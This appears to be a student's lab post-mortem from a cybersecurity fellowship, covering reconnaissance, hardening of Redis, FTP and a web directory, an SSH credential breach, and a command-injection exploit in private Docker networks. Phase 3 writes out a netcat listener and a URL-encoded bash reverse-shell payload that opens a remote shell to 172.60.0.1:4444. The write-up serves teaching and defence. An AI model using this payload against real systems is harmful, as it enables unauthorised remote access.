# Phase 1 Final Reckoning — TEPP Post-Mortem
**Operator:** Kevin Molinuevo
**Date:** May 28, 2026
**Repository:** https://github.com/KevinMolinuevo/PhaseOne
**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

### Triage Network — 172.100.0.0/24
The triage network contained three hosts: `172.100.0.11`, `172.100.0.12`, and `172.100.0.13`. Server 1 exposed Redis on TCP port `6379`, and the Redis INFO output confirmed that it was bound to `0.0.0.0`. Server 2 exposed FTP on TCP port `21` using `vsFTPd 3.0.2`, and anonymous login worked. Server 3 did not expose TCP services in the full-port scan, but local inspection showed dangerous world-writable directories, including `/var/www/html`.

### Breach Network — 172.80.0.0/24
The breach network target was `172.80.0.10`, intended to expose SSH on TCP port `22`. The original container failed with an invalid IP state, so the target had to be recreated and attached to the breach network. The credentials were identified as `root:admin123`, and the defensive response focused on blocking SSH access from the Docker gateway source.

### Exploitation Network — 172.60.0.0/24
The exploitation network contained `172.60.0.10`, a web application on TCP port `80`. The application source showed a vulnerable `/exec?cmd=` route that passed user input directly into `subprocess.Popen(cmd, shell=True)`. This confirmed command injection before the exploit attempt.

---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11
**Vulnerability Identified:** 
Redis was exposed on TCP port `6379`. I confirmed this with `redis-cli -h 172.100.0.11 INFO`, which showed `tcp_port:6379` and `listener0:name=tcp,bind=0.0.0.0,port=6379`.

**Remediation Commands:**
docker exec -it broken_server_1 sh
redis-cli CONFIG SET protected-mode yes
redis-cli CONFIG GET protected-mode
exit
Before State:
Redis was reachable from the triage network and listening on all interfaces.

**After State**:
Protected mode was the intended remediation to restrict unauthenticated network access.

**Analysis**:
An exposed Redis service is dangerous because Redis is often trusted as an internal-only service. If it is reachable without proper access controls, an attacker may enumerate configuration details or attempt data abuse. Internal services should not listen broadly unless authentication and network restrictions are enforced.

### Server 2 — 172.100.0.12

**Vulnerability Identified**:
FTP was exposed on TCP port 21, running vsFTPd 3.0.2. I confirmed the issue by connecting to 172.100.0.12 with FTP and successfully using anonymous login.

**Remediation Commands**:

docker exec -it broken_server_2 sh
ps aux
kill <vsftpd_PID>
exit
nmap -sV -p21 172.100.0.12

**Before State**:
The FTP service accepted connections and allowed anonymous access.

**After State**:
The intended fixed state was to terminate the rogue FTP process and confirm port 21 was no longer serving FTP.

**Analysis**:
Anonymous FTP is dangerous because it can expose files to unauthenticated users. Even if access is read-only, leaked files can support reconnaissance and later compromise. Removing unnecessary services reduces attack surface.

### Server 3 — 172.100.0.13

**Vulnerability Identified**:
The full-port scan showed no exposed TCP services, but local inspection revealed world-writable directories. The risky directory was /var/www/html; normal temporary directories such as /tmp and /var/tmp also appeared world-writable but use that permission pattern commonly.

**Remediation Commands**:

docker exec -it broken_server_3 sh
ls -ld /var/www/html
chmod 755 /var/www/html
ls -ld /var/www/html
exit

**Before State**:
/var/www/html was identified as dangerously writable.

**After State**:
The intended fixed state was 755, preventing unauthorized write access while preserving normal read and execute behavior.

**Analysis**:
A world-writable web directory is dangerous because attackers may be able to place or modify content served by the application. In an enterprise environment, this could lead to defacement, malware hosting, or privilege abuse. Web content directories should be writable only by authorized deployment users or service accounts.

---

### Phase 2: The Breach
**Cracked Credentials**:

Username: root
Password: admin123
Forensic Evidence:

Exact Timestamp of Successful Login: Not captured in ~/Midterm_Logs
Attacker IP Address: 172.80.0.1
Engineered iptables Rule:

sudo iptables -A DOCKER-USER -s 172.80.0.1 -d 172.80.0.10 -p tcp --dport 22 -j DROP
Verification:

Chain DOCKER-USER (1 references)
 pkts bytes target prot opt in out source      destination
 0    0     DROP   tcp  --  *  *   172.80.0.1  172.80.0.10 tcp dpt:22
SOC Analysis:
A single iptables rule is useful for immediate containment, but it is not enough as a complete defensive strategy. The weak credential still needs to be corrected through password rotation, SSH hardening, and failed-login monitoring. A real SOC would combine network blocking with alerting, authentication controls, and endpoint review.

---

### Phase 3: Full Spectrum
**Listener Configuration**:

nc -lvnp 4444
Reverse Shell Payload:

curl 'http://172.60.0.10/exec?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/172.60.0.1/4444%200%3E%261%22'
Command Injection Explanation:
The application was vulnerable because /exec?cmd= accepted user input and passed it directly into subprocess.Popen(cmd, shell=True). With shell=True, the system shell interprets the supplied command string. This allowed an unauthenticated HTTP request to trigger server-side command execution.

**Forensic Evidence**:

Process ID (PID): 1
User-Agent: curl/8.14.1
Evidence File: ~/Capstone_Logs/access.log
Logged Test Path: /exec?cmd=id
Logged Payload Path: /exec?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/172.60.0.1/4444%200%3E%261%22
Lockdown Command:

sudo iptables -A DOCKER-USER -s 172.60.0.1 -d 172.60.0.10 -p tcp --dport 80 -j DROP

**Final Analytical Paragraph**:
Executing both the offensive and defensive sides of this operation showed that small misconfigurations can quickly become serious security incidents. Exposed services, weak credentials, writable directories, and unsafe command execution each created a different path for compromise. The single most effective preventive control would have been strong input validation and removal of direct shell execution in the web application, because that would have stopped the command injection path before any reverse shell attempt. Defense is strongest when insecure design choices are corrected before network controls are needed.

Hydra Project. (2024). THC-Hydra: A fast and flexible online password cracking tool. https://github.com/vanhauser-thc/thc-hydra
Nmap Project. (2024). Nmap reference guide. https://nmap.org/book/man.html
Redis Ltd. (2024). Redis security documentation. https://redis.io/docs/latest/operate/oss_and_stack/management/security/
Python Software Foundation. (2024). subprocess — Subprocess management. https://docs.python.org/3/library/subprocess.html
